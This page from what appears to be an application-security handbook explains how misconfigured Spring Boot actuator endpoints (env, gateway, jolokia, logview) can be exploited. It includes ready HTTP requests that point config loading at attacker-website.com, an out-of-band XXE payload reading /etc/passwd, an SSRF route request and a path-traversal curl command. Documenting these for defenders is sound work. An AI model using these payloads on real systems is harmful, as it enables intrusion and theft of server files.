+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#spring-boot-actuators-overview"><b></b>Spring Boot actuators overview</a></li><li><span class="title-icon "></span><a href="#env"><b></b>env</a></li><ul><li><span class="title-icon "></span><a href="#springdatasourcetomcatvalidationquery"><b></b>spring.datasource.tomcat.validationQuery</a></li><li><span class="title-icon "></span><a href="#springdatasourcetomcaturl"><b></b>spring.datasource.tomcat.url</a></li><li><span class="title-icon "></span><a href="#springcloudbootstraplocation"><b></b>spring.cloud.bootstrap.location</a></li><li><span class="title-icon "></span><a href="#properties-requiring-restart-call"><b></b>Properties requiring /restart call</a></li></ul><li><span class="title-icon "></span><a href="#gateway"><b></b>gateway</a></li><li><span class="title-icon "></span><a href="#tracehttptrace"><b></b>trace/httptrace</a></li><li><span class="title-icon "></span><a href="#mappings"><b></b>mappings</a></li><li><span class="title-icon "></span><a href="#sessions"><b></b>sessions</a></li><li><span class="title-icon "></span><a href="#shutdown"><b></b>shutdown</a></li><li><span class="title-icon "></span><a href="#heapdump"><b></b>heapdump</a></li><li><span class="title-icon "></span><a href="#jolokia"><b></b>jolokia</a></li><ul><li><span class="title-icon "></span><a href="#logbackreloadbyurl"><b></b>Logback::reloadByURL</a></li><ul><li><span class="title-icon "></span><a href="#out-of-band-xxe"><b></b>Out-Of-Band XXE</a></li><li><span class="title-icon "></span><a href="#rce-via-jndi"><b></b>RCE via JNDI</a></li></ul><li><span class="title-icon "></span><a href="#tomcatcreatejndirealm"><b></b>Tomcat::createJNDIRealm</a></li><li><span class="title-icon "></span><a href="#jookia-cves"><b></b>Jookia CVEs</a></li></ul><li><span class="title-icon "></span><a href="#logfile"><b></b>logfile</a></li><li><span class="title-icon "></span><a href="#logview"><b></b>logview</a></li><li><span class="title-icon "></span><a href="#dumpthreaddump"><b></b>dump/threaddump</a></li><li><span class="title-icon "></span><a href="#references"><b></b>References</a></li></ul></div><a href="#spring-boot-actuators-overview" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="spring-boot-actuators-overview"><a name="spring-boot-actuators-overview" class="anchor-navigation-ex-anchor" href="#spring-boot-actuators-overview"><i class="fa fa-link" aria-hidden="true"></i></a>Spring Boot actuators overview</h1>
+<p>Spring Boot includes a number of additional features called <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html" target="_blank">actuators</a> to help monitor and control your application when you push it to production. Actuators allow you to control and monitor your application using either HTTP or JMX endpoints. Auditing, health and metrics gathering can also open a hidden door to the server if the application has been misconfigured.</p>
+<p>Spring Boot includes a number of built-in <a href="https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html#production-ready-endpoints" target="_blank">endpoints</a> (<a href="https://docs.spring.io/spring-boot/docs/1.5.x/reference/html/production-ready-endpoints.html" target="_blank">endpoints</a> for Spring Boot 1.x) and lets you add your own. For example, the <code>health</code> endpoint provides basic application health information.</p>
+<p>Each individual endpoint can be enabled or disabled and exposed (made remotely accessible) over HTTP or JMX. An endpoint is considered to be available when it is both enabled and exposed. The built-in endpoints will only be auto-configured when they are available. Most applications choose exposure via HTTP, where the ID of the endpoint along with a prefix of <code>/actuator</code> is mapped to a URL. For example, by default, the health endpoint is mapped to <code>/actuator/health</code>.</p>
+<p>To learn more about the actuator&apos;s endpoints and their request and response formats, see <a href="https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/" target="_blank">here</a>.</p>
+<h1 id="env"><a name="env" class="anchor-navigation-ex-anchor" href="#env"><i class="fa fa-link" aria-hidden="true"></i></a>env</h1>
+<p>Exposes properties from Spring&apos;s <code>ConfigurableEnvironment</code>.</p>
+<blockquote>
+<p>Spring Boot 2.x uses json instead of x-www-form-urlencoded for property change requests via the <code>env</code> endpoint.</p>
+<p>Information returned by the <code>env</code> and <code>configprops</code> endpoints can be somewhat sensitive so keys matching a certain pattern are <a href="https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/howto-actuator.html#howto-sanitize-sensible-values" target="_blank">sanitized</a> by default. However, there are still ways to get the plaintext value for such keys, see <a href="https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80" target="_blank">here</a>.</p>
+</blockquote>
+<h2 id="springdatasourcetomcatvalidationquery"><a name="springdatasourcetomcatvalidationquery" class="anchor-navigation-ex-anchor" href="#springdatasourcetomcatvalidationquery"><i class="fa fa-link" aria-hidden="true"></i></a>spring.datasource.tomcat.validationQuery</h2>
+<p><code>spring.datasource.tomcat.validationQuery</code> allows you to specify any SQL query, and it will be automatically executed against the current database. It could be any statement, including insert, update, or delete.</p>
+<p><img src="img/validation-query.png" alt=""></p>
+<h2 id="springdatasourcetomcaturl"><a name="springdatasourcetomcaturl" class="anchor-navigation-ex-anchor" href="#springdatasourcetomcaturl"><i class="fa fa-link" aria-hidden="true"></i></a>spring.datasource.tomcat.url</h2>
+<p><code>spring.datasource.tomcat.url</code> allows you to modify the current JDBC connection string.</p>
+<p>The problem here is that when the application establishing the connection to the database is already running, just updating the JDBC string has no effect. But you can try using <code>spring.datasource.tomcat.max-active</code> to increase the number of simultaneous database connections.</p>
+<p>Thus, you can change the JDBC connection string, increase the number of connections, and then send many requests to the application to simulate a heavy load. Under load, the application will create a new database connection with an updated malicious JDBC string.</p>
+<p><img src="img/current-jdbc-connection.png" alt=""></p>
+<h2 id="springcloudbootstraplocation"><a name="springcloudbootstraplocation" class="anchor-navigation-ex-anchor" href="#springcloudbootstraplocation"><i class="fa fa-link" aria-hidden="true"></i></a>spring.cloud.bootstrap.location</h2>
+<p><code>spring.cloud.bootstrap.location</code> allows you to load external config and parse it in YAML format.</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/env</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 127.0.0.1:8090
+<span class="hljs-attribute">Content-Type</span>: application/json
+<span class="hljs-attribute">Content-Length</span>: 76
+
+<span class="json">{<span class="hljs-attr">&quot;spring.cloud.bootstrap.location&quot;</span>:<span class="hljs-string">&quot;http://attacker-website.com/yaml-payload.yml&quot;</span>}
+</span></code></pre>
+<p>And you also need to call the <code>/refresh</code> endpoint.</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/refresh</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 127.0.0.1:8090
+<span class="hljs-attribute">Content-Length</span>: 0
+</code></pre>
+<p>When the YAML configuration is loaded from a remote server, it is parsed by the <code>SnakeYAML</code> library, which is susceptible to deserialization attacks. The payload can be generated using <a href="https://github.com/mbechler/marshalsec" target="_blank">marshalsec research</a>.</p>
+<h2 id="properties-requiring-restart-call"><a name="properties-requiring-restart-call" class="anchor-navigation-ex-anchor" href="#properties-requiring-restart-call"><i class="fa fa-link" aria-hidden="true"></i></a>Properties requiring /restart call</h2>
+<p>These properties have no effect unless the <code>/restart</code> endpoint is called, which restarts the entire <code>ApplicationContext</code> and is disabled by default.</p>
+<ul>
+<li><code>spring.datasource.url</code> - database connection string; used only for the first connection<ul>
+<li><a href="https://github.com/LandGrey/SpringBootVulExploit#0x08mysql-jdbc-deserialization-rce" target="_blank">MySQL JDBC deserialization RCE</a></li>
+</ul>
+</li>
+<li><code>spring.datasource.jndiName</code> - databases JNDI string; used only for the first connection</li>
+<li><code>spring.datasource.tomcat.dataSourceJNDI</code> - databases JNDI string; not used at all</li>
+<li><code>spring.cloud.config.uri</code> - spring cloud config url; have no effect after app start, only the initial values are used</li>
+<li><code>spring.datasource.hikari.connection-test-query</code> - the query to be executed before granting the connection from the pool; see <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database" target="_blank">Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database Aliases in Spring Boot 2</a></li>
+<li><code>spring.h2.console.enabled</code> - bool value which enables/disables the embedded GUI console of the H2 database; see <a href="https://github.com/LandGrey/SpringBootVulExploit#0x07h2-database-console-jndi-rce" target="_blank">H2 database console JNDI injection</a></li>
+</ul>
+<blockquote>
+<p>There are many other interesting properties, but most of them do not take effect immediately after being changed</p>
+</blockquote>
+<h1 id="gateway"><a name="gateway" class="anchor-navigation-ex-anchor" href="#gateway"><i class="fa fa-link" aria-hidden="true"></i></a>gateway</h1>
+<p>The <a href="https://cloud.spring.io/spring-cloud-gateway/reference/html/#actuator-api" target="_blank">/gateway</a> actuator endpoint lets you monitor and interact with a Spring Cloud Gateway application. In other words, you can define routes for the appkication and use <code>/gateway</code> actuator to trigger requests according to these routes.</p>
+<p>There are at least the following issues:</p>
+<ol>
+<li>Routes can provide access to hidden or internal endpoints, which can be misconfigured or vulnerable. You can fetch all available routes via <code>GET</code>-request to <code>/actuator/gateway/routes</code></li>
+<li><p>Full SSRF if <a href="https://cloud.spring.io/spring-cloud-gateway/reference/html/#creating-and-deleting-a-particular-route" target="_blank">adding routes</a> does not require administrative permissions. The next request will create a route to localhost:</p>
+<pre><code class="lang-http"> POST /actuator/gateway/routes/new_route HTTP/1.1
+ Host: app
+ Content-Type: application/json
+
+ {
+ &quot;predicates&quot;: [
+     {
+     &quot;name&quot;: &quot;Path&quot;,
+     &quot;args&quot;: {
+         &quot;_genkey_0&quot;: &quot;/new_route/**&quot;
+     }
+     }
+ ],
+ &quot;filters&quot;: [
+     {
+     &quot;name&quot;: &quot;RewritePath&quot;,
+     &quot;args&quot;: {
+         &quot;_genkey_0&quot;: &quot;/new_route(?&lt;path&gt;.*)&quot;,
+         &quot;_genkey_1&quot;: &quot;/${path}&quot;
+     }
+     }
+ ],
+ &quot;uri&quot;: &quot;https://localhost&quot;,
+ &quot;order&quot;: 0
+ }
+</code></pre>
+<p> Send refresh request to apply new route:</p>
+<pre><code class="lang-http"> POST /actuator/gateway/refresh HTTP/1.1
+ Host: app
+ Content-Type: application/json
+
+ {
+     &quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;,
+     &quot;route_id&quot;: &quot;new_route&quot;,
+     &quot;filters&quot;: [
+         &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /${path}], order = 1]&quot;
+     ],
+     &quot;uri&quot;: &quot;https://localhost&quot;,
+     &quot;order&quot;: 0
+ }
+</code></pre>
+</li>
+</ol>
+<p>References:</p>
+<ul>
+<li><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/" target="_blank">BRING YOUR OWN SSRF &#x2013; THE GATEWAY ACTUATOR</a></li>
+</ul>
+<h1 id="tracehttptrace"><a name="tracehttptrace" class="anchor-navigation-ex-anchor" href="#tracehttptrace"><i class="fa fa-link" aria-hidden="true"></i></a>trace/httptrace</h1>
+<p>Displays HTTP trace information (by default, the last 100 HTTP request-response exchanges). Requires an <code>HttpTraceRepository</code> bean.</p>
+<h1 id="mappings"><a name="mappings" class="anchor-navigation-ex-anchor" href="#mappings"><i class="fa fa-link" aria-hidden="true"></i></a>mappings</h1>
+<p>Displays a collated list of all <code>@RequestMapping</code> paths.</p>
+<h1 id="sessions"><a name="sessions" class="anchor-navigation-ex-anchor" href="#sessions"><i class="fa fa-link" aria-hidden="true"></i></a>sessions</h1>
+<p>Allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a Servlet-based web application using Spring Session.</p>
+<h1 id="shutdown"><a name="shutdown" class="anchor-navigation-ex-anchor" href="#shutdown"><i class="fa fa-link" aria-hidden="true"></i></a>shutdown</h1>
+<p>Lets the application be gracefully shutdown. Disabled by default.</p>
+<h1 id="heapdump"><a name="heapdump" class="anchor-navigation-ex-anchor" href="#heapdump"><i class="fa fa-link" aria-hidden="true"></i></a>heapdump</h1>
+<p>Returns an hprof heap dump file.</p>
+<h1 id="jolokia"><a name="jolokia" class="anchor-navigation-ex-anchor" href="#jolokia"><i class="fa fa-link" aria-hidden="true"></i></a>jolokia</h1>
+<p>Exposes JMX beans over HTTP (when Jolokia is on the classpath, not available for WebFlux). Requires a dependency on <code>jolokia-core</code>.</p>
+<h2 id="logbackreloadbyurl"><a name="logbackreloadbyurl" class="anchor-navigation-ex-anchor" href="#logbackreloadbyurl"><i class="fa fa-link" aria-hidden="true"></i></a>Logback::reloadByURL</h2>
+<p>You can list all available MBeans actions using the URL:</p>
+<pre><code class="lang-http">http://127.0.0.1:8090/jolokia/list
+</code></pre>
+<p>Most MBeans actions just expose some system data, but if the <code>reloadByURL</code> action provided by the <code>Logback</code> library exists:</p>
+<p><img src="img/jolokia-list.png" alt=""></p>
+<p>the logging configuration can be reload from an external URL:</p>
+<pre><code class="lang-http">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker-website.com!/logback.xml
+</code></pre>
+<h3 id="out-of-band-xxe"><a name="out-of-band-xxe" class="anchor-navigation-ex-anchor" href="#out-of-band-xxe"><i class="fa fa-link" aria-hidden="true"></i></a>Out-Of-Band XXE</h3>
+<p><code>Logback</code> uses XML configuration parsed by the <code>SAXParser</code> XML parser with external entities enabled. You can exploit this feature to trigger an Out-Of-Band XXE:</p>
+<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- logback.xml --&gt;</span>
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE a [ &lt;!ENTITY % remote SYSTEM &quot;http://attacker-website.com/file.dtd&quot;&gt;%remote;%int;]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&amp;trick;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-xml">&lt;!-- file.dtd --&gt;
+&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt; 
+&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &apos;:%d;&apos;&gt;&quot;&gt;
+</code></pre>
+<p><img src="img/oob-xxe.png" alt="Server response with error and contents of `/etc/passwd` file"></p>
+<h3 id="rce-via-jndi"><a name="rce-via-jndi" class="anchor-navigation-ex-anchor" href="#rce-via-jndi"><i class="fa fa-link" aria-hidden="true"></i></a>RCE via JNDI</h3>
+<p>The <code>Logback</code> configuration has the feature <a href="https://logback.qos.ch/manual/configuration.html#insertFromJNDI" target="_blank">Obtaining variables from JNDI</a>. In the XML configuration file you can include a tag like:</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;java:comp/env/appName&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span>/&gt;</span>
+</code></pre>
+<p>In this case, the <code>env-entry-name</code> attribute will be passed to the <code>DirContext.lookup()</code> method. Providing an arbitrary name to the <code>lookup</code> method can lead to remote code execution via remote class loading.</p>
+<p>See here:</p>
+<ul>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank">A Journey From JNDI/LDAP Manipulation To RCE</a></li>
+<li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank">Exploiting JNDI Injections in Java</a></li>
+</ul>
+<h2 id="tomcatcreatejndirealm"><a name="tomcatcreatejndirealm" class="anchor-navigation-ex-anchor" href="#tomcatcreatejndirealm"><i class="fa fa-link" aria-hidden="true"></i></a>Tomcat::createJNDIRealm</h2>
+<p>One of the MBeans of Tomcat (embedded into Spring Boot) is <code>createJNDIRealm</code>, which allows you to create JNDIRealm vulnerable to JNDI injection. Details of exploitation see <a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html" target="_blank">here</a> and <a href="https://github.com/LandGrey/SpringBootVulExploit#0x05jolokia-realm-jndi-rce" target="_blank">here</a>.</p>
+<h2 id="jookia-cves"><a name="jookia-cves" class="anchor-navigation-ex-anchor" href="#jookia-cves"><i class="fa fa-link" aria-hidden="true"></i></a>Jookia CVEs</h2>
+<ul>
+<li><a href="https://blog.it-securityguard.com/how-i-made-more-than-30k-with-jolokia-cves/" target="_blank">How I made more than $30K with Jolokia CVEs</a></li>
+<li><a href="https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html" target="_blank">Jolokia Vulnerabilities - RCE &amp; XSS</a></li>
+</ul>
+<h1 id="logfile"><a name="logfile" class="anchor-navigation-ex-anchor" href="#logfile"><i class="fa fa-link" aria-hidden="true"></i></a>logfile</h1>
+<p>Returns the contents of the logfile (if <code>logging.file.name</code> or <code>logging.file.path</code> properties have been set). Supports the use of the HTTP Range header to retrieve part of the log file&apos;s content.</p>
+<h1 id="logview"><a name="logview" class="anchor-navigation-ex-anchor" href="#logview"><i class="fa fa-link" aria-hidden="true"></i></a>logview</h1>
+<p><a href="https://github.com/lukashinsch/spring-boot-actuator-logview" target="_blank">spring-boot-actuator-logview</a> version before <code>0.2.13</code> is vulnerable to path traversal that allows you to retreive arbitrary files.</p>
+<pre><code class="lang-bash"><span class="hljs-comment"># retreaving /etc/passwd</span>
+$ curl http://localhost:8887/manage/<span class="hljs-built_in">log</span>/view?filename=/etc/passwd&amp;base=../../../../../
+</code></pre>
+<p>References:</p>
+<ul>
+<li><a href="https://pyn3rd.github.io/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/" target="_blank">Writeup: CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal</a></li>
+</ul>
+<h1 id="dumpthreaddump"><a name="dumpthreaddump" class="anchor-navigation-ex-anchor" href="#dumpthreaddump"><i class="fa fa-link" aria-hidden="true"></i></a>dump/threaddump</h1>
+<p>Performs a thread dump.</p>
+<h1 id="references"><a name="references" class="anchor-navigation-ex-anchor" href="#references"><i class="fa fa-link" aria-hidden="true"></i></a>References</h1>
+<ul>
+<li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-features.html" target="_blank">Spring Boot Actuator: Production-ready Features</a></li>
+<li><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank">Exploiting Spring Boot Actuators</a></li>
+<li><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit" target="_blank">Spring Boot Actuator (jolokia) XXE/RCE</a></li>
+<li><a href="https://github.com/pyn3rd/Spring-Boot-Vulnerability" target="_blank">Spring Boot Vulnerability (to be continued....)</a></li>
+</ul>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="spel-injection.html" class="navigation navigation-prev " aria-label="Previous page: SpEL Injection">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="spring-data-redis-insecure-deserialization.html" class="navigation navigation-next " aria-label="Next page: Spring Data Redis Insecure Deserialization">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Spring Boot Actuators","level":"5.1.5","depth":2,"next":{"title":"Spring Data Redis Insecure Deserialization","level":"5.1.6","depth":2,"path":"Framework/Spring/spring-data-redis-insecure-deserialization.md","ref":"Framework/Spring/spring-data-redis-insecure-deserialization.md","articles":[]},"previous":{"title":"SpEL Injection","level":"5.1.4","depth":2,"path":"Framework/Spring/spel-injection.md","ref":"Framework/Spring/spel-injection.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["anchor-navigation-ex","edit-link","copy-code-button","theme-comscore","ga"],"pluginsConfig":{"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"fontSettings":{"theme":"night","family":"sans"},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":false,"pageTop":{"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"copy-code-button":{},"ga":{"configuration":"auto","token":""},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"edit-link":{"label":"Edit This Page","base":"https://github.com/sm2774us/application_security/edit/master/"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Framework/Spring/spring-boot-actuators.md","mtime":"2022-02-25T04:54:13.448Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-02-25T04:54:42.293Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-edit-link/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
